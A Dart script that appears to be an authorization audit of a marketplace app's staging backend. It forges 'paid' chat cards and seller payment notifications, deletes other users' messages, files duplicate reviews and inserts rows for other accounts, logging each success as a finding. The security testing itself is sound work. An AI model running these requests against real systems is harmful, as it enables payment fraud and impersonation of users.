/// Pass 3 — J1 UPDATE bypass, J2 dup, J5 notify INSERT, J7 order unchanged.
/// Staging only. No fixes.
import 'dart:io';

import '_rtj.dart';

Future<void> main() async {
  final env = loadEnv();
  final c = Rtj.fromEnv(env);
  await c.loginActors(env);
  await c.ensureBuyer2();

  const chatId = 'ac2902d3-a3ca-4f82-b7de-2532db9cafba';
  const oidConcluido = 'dfd82e0e-1a76-4d59-a2ed-bf09f581065f';

  // ------------------------------------------------------------------
  // J1 — plain INSERT then PATCH to server-only JSON (bypass insert guard)
  // ------------------------------------------------------------------
  Future<Map<String, Object?>> plainThenJson(String kind, Map extra) async {
    final ins = await c.rest('POST', 'chat_messages', jwt: c.buyerJwt, body: {
      'chat_id': chatId,
      'sender_id': c.buyerId,
      'text': '$prefix plain $kind',
    });
    if (ins.status != 201 || ins.firstId == null) {
      return {
        'kind': kind,
        'insert_http': ins.status,
        'insert_body': ins.snippet,
      };
    }
    final id = ins.firstId;
    final payload = <String, Object?>{'kind': kind, ...extra};
    final upd = await c.rest(
      'PATCH',
      'chat_messages?id=eq.$id',
      jwt: c.buyerJwt,
      body: {'text': fleaberCard(payload)},
    );
    return {
      'kind': kind,
      'id': id,
      'insert_http': ins.status,
      'patch_http': upd.status,
      'stored': upd.map?['text'] ?? (upd.list.isNotEmpty
          ? (upd.list.first as Map)['text']
          : null),
      'body': upd.snippet,
    };
  }

  final bypass = <Map<String, Object?>>[
    await plainThenJson('marketplace_bag_paid', {
      'order_id': oidConcluido,
      'total': 0.01,
    }),
    await plainThenJson('raffle_prize', {'prize': 'RTJ-bike'}),
    await plainThenJson('premio_rifa', {'prize': 'RTJ'}),
    await plainThenJson('auto_feedback_generated', {'stars': 5}),
    await plainThenJson('order_paid', {'total': 1}),
    await plainThenJson('seguro_fleaber_paid', {
      'order_id': oidConcluido,
      'total': 99999.00,
    }),
  ];
  c.note('j1.plain_to_json', bypass);
  for (final b in bypass) {
    final stored = b['stored']?.toString() ?? '';
    final kind = b['kind'];
    if (b['patch_http'] == 200 && stored.contains('"kind":"$kind"')) {
      final server = kind == 'marketplace_bag_paid' ||
          kind == 'raffle_prize' ||
          kind == 'premio_rifa' ||
          kind == 'auto_feedback_generated';
      c.addFinding(finding(
        id: '$prefix-J1-PLAIN-TO-JSON-$kind',
        lens: 'J1',
        severity: server ? 'P1' : 'P2',
        title:
            'UPDATE texto simples → FLEABER_JSON_V1 kind=$kind (contorna guard INSERT)',
        pre: 'INSERT plain; PATCH JSON; insert-guard não corre no UPDATE',
        repro: 'POST chat_messages text=plain; PATCH text=FLEABER_JSON_V1:$kind',
        proven: true,
        evidence: b,
      ));
    }
  }

  // DELETE seller message as buyer
  final sellerMsg = await c.rest(
    'GET',
    'chat_messages?chat_id=eq.$chatId&sender_id=eq.${c.sellerId}&select=id,text&limit=1',
    jwt: c.buyerJwt,
  );
  if (sellerMsg.firstId != null) {
    final del = await c.rest(
      'DELETE',
      'chat_messages?id=eq.${sellerMsg.firstId}',
      jwt: c.buyerJwt,
    );
    c.note('j1.delete_seller_msg', {
      'id': sellerMsg.firstId,
      'http': del.status,
      'body': del.snippet,
    });
    if (del.status == 204 || del.status == 200) {
      c.addFinding(finding(
        id: '$prefix-J1-DELETE-ALHEIO',
        lens: 'J1',
        severity: 'P2',
        title: 'Buyer DELETE mensagem do seller',
        pre: 'chat_messages_delete_own deveria bloquear',
        repro: 'DELETE chat_messages id=seller',
        proven: true,
        evidence: {'id': sellerMsg.firstId, 'http': del.status},
      ));
    }
  }

  // ------------------------------------------------------------------
  // Fixture pending order + cards (true unpaid)
  // ------------------------------------------------------------------
  final prod = await c.rest(
    'GET',
    'products?seller_id=eq.${c.sellerId}&select=id,price,quantity&limit=1',
    service: true,
  );
  final pid = prod.firstId;
  Map<String, Object?> pending = {};
  if (pid != null) {
    final ord = await c.rest('POST', 'orders', service: true, body: {
      'buyer_id': c.buyerId,
      'seller_id': c.sellerId,
      'product_id': pid,
      'quantity': 1,
      'status': 'reserva_pendente',
      'price_total': 12.34,
      'payment_method': 'Pagamento na app',
    });
    pending = {
      'http': ord.status,
      'id': ord.firstId,
      'status': ord.map?['status'],
      'body': ord.snippet,
    };
    c.note('fixture.pending_order', pending);
    final oid = ord.firstId;
    if (oid != null) {
      final card = await c.rest('POST', 'chat_messages', jwt: c.buyerJwt, body: {
        'chat_id': chatId,
        'sender_id': c.buyerId,
        'text': fleaberCard({
          'kind': 'seguro_fleaber_paid',
          'order_id': oid,
          'total': 8888.88,
          'label': '$prefix-PENDING-LIE',
        }),
      });
      final after = await c.rest(
        'GET',
        'orders?id=eq.$oid&select=id,status,amount_paid_cents,price_total,stripe_payment_intent_id',
        service: true,
      );
      c.note('j1.pending_seguro', {
        'card_http': card.status,
        'card_id': card.firstId,
        'card_text': card.map?['text'],
        'order_after': after.map,
      });
      final st = after.map?['status']?.toString() ?? '';
      if (card.status == 201 &&
          st.toLowerCase().contains('pendente')) {
        c.addFinding(finding(
          id: '$prefix-J1-SEGURO-TRUE-UNPAID',
          lens: 'J1',
          severity: 'P2',
          title: 'Card «pago» 8888€ em encomenda reserva_pendente; BD inalterada',
          pre: 'order fixture reserva_pendente',
          repro: 'POST chat_messages seguro_fleaber_paid',
          proven: true,
          evidence: {
            'order': oid,
            'status_after': st,
            'paid_cents': after.map?['amount_paid_cents'],
            'card': card.firstId,
          },
        ));
      }
      final ship = await c.rest('POST', 'chat_messages', jwt: c.sellerJwt, body: {
        'chat_id': chatId,
        'sender_id': c.sellerId,
        'text': fleaberCard({
          'kind': 'reservation_order_shipped',
          'order_id': oid,
        }),
      });
      final after2 = await c.rest(
        'GET',
        'orders?id=eq.$oid&select=id,status',
        service: true,
      );
      c.note('j1.pending_ship_card', {
        'http': ship.status,
        'order': after2.map,
      });
      // J7 refund on pending as seller (real seller of fixture)
      final ref = await c.edge('refund-order', {'order_id': oid}, jwt: c.sellerJwt);
      c.note('j7.refund_pending', {'http': ref.status, 'body': ref.snippet});
    }
  }

  // ------------------------------------------------------------------
  // J2 — second review on same order (dup)
  // ------------------------------------------------------------------
  final dup2 = await c.rest('POST', 'reviews', jwt: c.buyerJwt, body: {
    'stars': 1,
    'comment': '$prefix dup2',
    'order_id': oidConcluido,
    'buyer_id': c.buyerId,
  });
  c.note('j2.dup2', {
    'http': dup2.status,
    'id': dup2.firstId,
    'body': dup2.snippet,
  });
  if (dup2.status == 201) {
    c.addFinding(finding(
      id: '$prefix-J2-REVIEW-DUP',
      lens: 'J2',
      severity: 'P1',
      title: 'Segunda review humana no mesmo order_id persistiu',
      pre: 'já existia review comprador nesta encomenda (pass1 dup_or_ok)',
      repro: 'POST reviews order_id=dfd82e0e…',
      proven: true,
      evidence: {'id': dup2.firstId, 'body': dup2.snippet},
    ));
  }

  final revAnon = await c.rest('GET',
      'reviews_gerais?select=id,buyer_id,target_id,stars&limit=5');
  c.note('j2.reviews_gerais_anon', {
    'http': revAnon.status,
    'n': revAnon.list.length,
    'body': clip(revAnon.body, 400),
  });

  final revTableB2 = await c.rest(
    'GET',
    'reviews?select=id,buyer_id,target_id,stars&limit=8',
    jwt: c.buyer2Jwt,
  );
  c.note('j2.reviews_table_b2', {
    'http': revTableB2.status,
    'n': revTableB2.list.length,
    'alien': revTableB2.list.where((e) {
      if (e is! Map) return false;
      return e['buyer_id'] != c.buyer2Id && e['target_id'] != c.buyer2Id;
    }).length,
    'sample': clip(revTableB2.body, 300),
  });

  // ------------------------------------------------------------------
  // J5 — user_notifications INSERT to seller
  // ------------------------------------------------------------------
  final nOwn = await c.rest('POST', 'user_notifications', jwt: c.buyer2Jwt, body: {
    'user_id': c.buyer2Id,
    'kind': 'seguro_fleaber_paid',
    'title': '$prefix self',
    'body': 'teste',
    'chat_id': chatId,
    'actor_id': c.buyer2Id,
  });
  final nX = await c.rest('POST', 'user_notifications', jwt: c.buyer2Jwt, body: {
    'user_id': c.sellerId,
    'kind': 'seguro_fleaber_paid',
    'title': 'Compra paga (Seguro Fleaber)',
    'body': 'Nova venda protegida · 8 888,88 €',
    'chat_id': chatId,
    'actor_id': c.buyer2Id,
  });
  c.note('j5.notify_insert', {
    'own': {'http': nOwn.status, 'id': nOwn.firstId, 'body': nOwn.snippet},
    'cross': {'http': nX.status, 'id': nX.firstId, 'body': nX.snippet},
  });
  if (nX.status == 201) {
    c.addFinding(finding(
      id: '$prefix-J5-NOTIFY-FORGE',
      lens: 'J5',
      severity: 'P1',
      title: 'buyer2 INSERT user_notifications para o seller (recibo falso)',
      pre: 'sem policy INSERT visível; Flutter também faz insert cross-user',
      repro: 'POST user_notifications user_id=seller kind=seguro_fleaber_paid',
      proven: true,
      evidence: {'id': nX.firstId, 'body': nX.snippet},
    ));
    // confirm seller can read it
    final readS = await c.rest(
      'GET',
      'user_notifications?id=eq.${nX.firstId}&select=id,user_id,kind,title,body,chat_id',
      jwt: c.sellerJwt,
    );
    c.note('j5.seller_reads_forged', {
      'http': readS.status,
      'n': readS.list.length,
      'row': readS.map,
    });
  }

  final nReadX = await c.rest(
    'GET',
    'user_notifications?user_id=eq.${c.sellerId}&select=id,title,kind&limit=5',
    jwt: c.buyer2Jwt,
  );
  c.note('j5.b2_read_seller_notifs', {
    'http': nReadX.status,
    'n': nReadX.list.length,
    'body': nReadX.snippet,
  });
  if (nReadX.list.isNotEmpty) {
    c.addFinding(finding(
      id: '$prefix-J5-NOTIFY-READ-ALIEN',
      lens: 'J5',
      severity: 'P2',
      title: 'buyer2 lê notificações do seller',
      pre: 'GET user_notifications?user_id=seller',
      repro: 'GET',
      proven: true,
      evidence: {'n': nReadX.list.length},
    ));
  }

  // helper-invite kind (1 probe — invite enum residual)
  final nHelp = await c.rest('POST', 'user_notifications', jwt: c.buyer2Jwt, body: {
    'user_id': c.sellerId,
    'kind': 'helper_invite:00000000-0000-0000-0000-000000000001',
    'title': 'Convite colaborador',
    'body': 'pwn',
    'actor_id': c.buyer2Id,
  });
  c.note('j5.helper_kind', {'http': nHelp.status, 'body': nHelp.snippet});

  // seller_device_tokens with plausible columns
  final tok = await c.rest('POST', 'seller_device_tokens', jwt: c.buyer2Jwt, body: {
    'seller_id': c.sellerId,
    'device_id': '$prefix-dev',
    'label': 'rtj',
  });
  c.note('j5.device_token_insert', {'http': tok.status, 'body': tok.snippet});
  if (tok.status == 201) {
    c.addFinding(finding(
      id: '$prefix-J5-DEVICE-TOKEN',
      lens: 'J5',
      severity: 'P1',
      title: 'buyer2 INSERT seller_device_tokens do seller',
      pre: 'POST seller_device_tokens',
      repro: 'POST',
      proven: true,
      evidence: {'id': tok.firstId},
    ));
  }

  // ------------------------------------------------------------------
  // product_bundles hostile
  // ------------------------------------------------------------------
  final bun = await c.rest('POST', 'product_bundles', jwt: c.buyer2Jwt, body: {
    'seller_id': c.sellerId,
    'buyer_id': c.buyer2Id,
    'chat_id': chatId,
    'status': 'accepted',
    'total_eur': 0.01,
    'subtotal_eur': 500,
    'discount_pct': 99,
  });
  c.note('j7.bundle_insert', {'http': bun.status, 'id': bun.firstId, 'body': bun.snippet});
  if (bun.status == 201 &&
      (bun.map?['status']?.toString().toLowerCase() == 'accepted')) {
    c.addFinding(finding(
      id: '$prefix-J7-BUNDLE-ACCEPTED',
      lens: 'J7',
      severity: 'P1',
      title: 'JWT INSERT product_bundles status=accepted',
      pre: 'buyer2, chat alheio, total 0.01',
      repro: 'POST product_bundles',
      proven: true,
      evidence: bun.map,
    ));
  }

  await dumpJson('${Directory.current.path}/out/pass3.json', {
    'prefix': prefix,
    'notes': c.notes,
    'findings': c.findings,
  });
  stdout.writeln('pass3 findings=${c.findings.length}');
  for (final f in c.findings) {
    stdout.writeln('  ${f['severity']} ${f['id']} ${f['title']}');
  }
}
